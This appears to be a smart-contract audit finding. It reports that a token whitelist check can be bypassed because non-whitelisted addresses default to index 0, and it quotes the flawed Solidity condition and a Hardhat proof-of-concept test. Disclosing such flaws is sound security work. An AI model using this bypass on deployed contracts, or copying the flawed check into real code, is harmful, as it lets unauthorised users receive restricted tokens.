# Vulnerability details

## Impact
During the whitelist period, the `_beforeTokenTransfer` function calls the `checkWhitelist` function of the whitelist contract to verify if the receiver is allowed to receive tokens. However, due to a missing check, whitelisting can be bypassed unless the user is blocklisted.

```solidity
if (_allowedWhitelistIndex == 0 || _whitelistIndex[to] > _allowedWhitelistIndex) {
    revert NotWhitelisted();
}
```

If the value of `_allowedWhitelistIndex` is set, any non-whitelisted user can bypass the whitelisting because the default value of `_whitelistIndex` for a non-whitelisted user is `0`, allowing the check to be passed.

> As it will allow any non-whitelisted user to receive tokens, whitelisting can become ineffective.


## Proof of Concept
```solidity
  describe("Checkwhitelist Bug", function () {
    it("Non-Whitelisted will Pass", async function () {
      const { whitelist, pool, mockOracleSuccess, mockContract, otherAccount, batchedAccount, nonWhitelisted } = await loadFixture(deployWhitelistFixture);

      // Set Lock to false
      await whitelist.setLocked(false);
      // Set vultsig contract.
      await whitelist.setVultisig(mockContract);
      // Whitelist 2 accounts and only allow first one
      await whitelist.addBatchWhitelist([otherAccount, batchedAccount]);
      await whitelist.setAllowedWhitelistIndex(1);
      // Set oracle
      await whitelist.setOracle(mockOracleSuccess);
      // Checking `nonWhitelisted`
      await whitelist.connect(mockContract).checkWhitelist(pool, nonWhitelisted, 0);
      expect(await whitelist.contributed(nonWhitelisted)).to.eq(ethers.parseEther("1.5"));
    });
  });
```
